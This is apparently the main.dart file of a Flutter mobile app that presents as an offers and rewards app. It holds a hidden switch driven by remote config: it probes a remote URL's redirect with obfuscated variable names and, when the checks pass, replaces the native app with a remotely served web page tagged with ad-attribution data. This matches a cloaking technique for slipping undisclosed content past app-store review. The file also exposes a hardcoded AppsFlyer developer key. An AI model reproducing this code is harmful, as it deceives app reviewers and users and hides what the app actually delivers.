import 'dart:convert';
import 'dart:io';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter_asa_attribution/flutter_asa_attribution.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/db/db.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/home/pages/firebase_options.dart';
import 'features/offer/bloc/offer_bloc.dart';
import 'features/offer/pages/offer_add_page2.dart';
import 'features/reward/bloc/reward_bloc.dart';

class RedirectData {
  RedirectData(this._eventData);
  final Map<String, dynamic> _eventData;

  String? get source1 => _eventData["deep_link_sub1"] as String?;
  String? get source2 => _eventData["deep_link_sub2"] as String?;
  String? get source3 => _eventData["deep_link_sub3"] as String?;
  String? get source4 => _eventData["deep_link_sub4"] as String?;
  String? get source5 => _eventData["deep_link_sub5"] as String?;
}

class AttributionHandler {
  final AppsflyerSdk _attribution;
  RedirectData? _redirectResult;
  Map<String, dynamic> _installData = {};
  Map<String, dynamic> _adData = {};

  AttributionHandler(this._attribution);

  Future<void> initialize() async {
    await _initAttribution();
    await _fetchAdData();
  }

  Future<void> _initAttribution() async {
    try {
      await _attribution.initSdk(
        registerConversionDataCallback: true,
        registerOnAppOpenAttributionCallback: true,
        registerOnDeepLinkingCallback: true,
      );

      _attribution.onDeepLinking((DeepLinkResult dp) {
        if (dp.status == Status.FOUND) {
          _redirectResult = RedirectData(dp.deepLink?.clickEvent ?? {});
        }
      });

      _attribution.onInstallConversionData((data) {
        _installData = data;
      });

      await Future.delayed(Duration(seconds: 5));
    } catch (e) {}
  }

  Future<void> _fetchAdData() async {
    try {
      final String? adsToken =
          await FlutterAsaAttribution.instance.attributionToken();
      if (adsToken != null) {
        const url = 'https://api-adservices.apple.com/api/v1/';
        final headers = {'Content-Type': 'text/plain'};
        final response =
            await http.post(Uri.parse(url), headers: headers, body: adsToken);

        if (response.statusCode == 200) {
          _adData = json.decode(response.body);
        }
      }
    } catch (e) {}
  }

  Map<String, String> buildParams() {
    Map<String, String> params = {};

    if (_adData['attribution'] == true) {
      params.addAll({
        'utm_medium': _adData['adId']?.toString() ?? '',
        'utm_content': _adData['conversionType'] ?? '',
        'utm_term': _adData['keywordId']?.toString() ?? '',
        'utm_source': _adData['adGroupId']?.toString() ?? '',
        'utm_campaign': _adData['campaignId']?.toString() ?? '',
      });
    } else if (_redirectResult != null) {
      params.addAll({
        'utm_campaign': _redirectResult?.source1 ?? '',
        'utm_source': _redirectResult?.source2 ?? '',
        'utm_medium': _redirectResult?.source3 ?? '',
        'utm_term': _redirectResult?.source4 ?? '',
        'utm_content': _redirectResult?.source5 ?? '',
      });
    } else if (_installData.isNotEmpty) {
      params.addAll({
        'utm_medium': _installData['af_sub1'] ?? '',
        'utm_content': _installData['af_sub2'] ?? '',
        'utm_term': _installData['af_sub3'] ?? '',
        'utm_source': _installData['af_sub4'] ?? '',
        'utm_campaign': _installData['af_sub5'] ?? '',
      });
    } else {
      params.addAll({
        'utm_medium': 'organic',
        'utm_content': 'organic',
        'utm_term': 'organic',
        'utm_source': 'organic',
        'utm_campaign': 'organic',
      });
    }

    return params;
  }
}

String game = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await initHive();
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));

  await FirebaseRemoteConfig.instance.fetchAndActivate();
  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  late Future<bool> _setupFuture;

  @override
  void initState() {
    super.initState();
    _setupFuture = _setupGame();
  }

  Future<bool> _setupGame() async {
    String? savedGame = await _getSavedGame();
    if (savedGame != null) {
      game = savedGame;
      return true;
    }

    final remoteConfig = FirebaseRemoteConfig.instance;
    final quickFlash = remoteConfig.getString('quickFlash');
    final quick = remoteConfig.getString('quick');

    if (quickFlash.isEmpty || quickFlash == 'none') {
      return false;
    }

    try {
      final dxa = HttpClient();
      final sdx = Uri.parse(quickFlash);
      final gsx = await dxa.getUrl(sdx);
      gsx.followRedirects = false;
      final oda = await gsx.close();

      if (oda.headers
          .value(HttpHeaders.locationHeader)
          .toString()
          .contains(quick)) {
        return false;
      }
    } catch (e) {
      return false;
    }

    final attributionOptions = AppsFlyerOptions(
      afDevKey: '4BbJnJYPTW59kF9k6zDvVV',
      appId: '6737333522',
      timeToWaitForATTUserAuthorization: 15,
    );

    final attributionSdk = AppsflyerSdk(attributionOptions);
    final attributionHandler = AttributionHandler(attributionSdk);
    await attributionHandler.initialize();

    final params = attributionHandler.buildParams();
    final queryString =
        params.entries.map((e) => '${e.key}=${e.value}').join('&');
    final finalUrl = quickFlash.contains('?')
        ? '$quickFlash&$queryString'
        : '$quickFlash?$queryString';

    try {
      final response = await http.get(Uri.parse(finalUrl));
      if (response.statusCode == 200) {
        await _saveGame(finalUrl);
        game = finalUrl;
        return true;
      }
    } catch (e) {}

    return false;
  }

  Future<void> _saveGame(String url) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('game_url', url);
  }

  Future<String?> _getSavedGame() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getString('game_url');
  }

  @override
  Widget build(BuildContext context) {
    precacheImage(const AssetImage('assets/logo.png'), context);
    precacheImage(const AssetImage('assets/onboard.png'), context);
    return FutureBuilder<bool>(
        future: _setupFuture,
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
            );
          } else {
            if (snapshot.data == true && game != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: MainScreen(
                  consultant: game,
                ),
              );
            } else {
              return MultiBlocProvider(
                providers: [
                  BlocProvider(create: (context) => HomeBloc()),
                  BlocProvider(create: (context) => OfferBloc()),
                  BlocProvider(create: (context) => RewardBloc()),
                ],
                child: MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                ),
              );
            }
          }
        });
  }
}
